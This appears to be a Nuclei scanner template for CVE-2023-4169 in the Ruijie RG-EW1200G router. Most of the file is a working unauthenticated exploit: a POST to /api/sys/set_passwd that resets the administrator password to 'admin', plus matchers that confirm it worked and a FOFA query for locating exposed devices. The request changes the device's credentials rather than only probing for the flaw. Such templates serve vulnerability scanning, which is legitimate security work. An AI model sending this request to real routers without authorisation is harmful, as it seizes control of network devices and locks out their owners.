id: CVE-2023-4169

info:
  name: Ruijie RG-EW1200G Router - Password Reset
  author: DhiyaneshDK
  severity: high
  description: |
    A vulnerability was found in Ruijie RG-EW1200G 1.0(1)B1P5. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the file /api/sys/set_passwd of the component Administrator Password Handler. The manipulation leads to improper access controls. The attack can be launched remotely.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-4169
    - https://github.com/blakespire/repoforcve/tree/main/RG-EW1200G
  metadata:
    max-request: 1
    fofa-query: body="app.2fe6356cdd1ddd0eb8d6317d1a48d379.css"
    vendor: ruijienetworks
    product: rg-ew1200g_firmware
  tags: cve,cve2023,ruijie,router,intrusive

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/sys/set_passwd"
    body: |
        {
        "username":"web",
        "admin_new":"admin"
        }

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '友情提示'
          - '"result":"ok"'
        condition: and

      - type: word
        part: header
        words:
          - application/json

      - type: status
        status:
          - 200
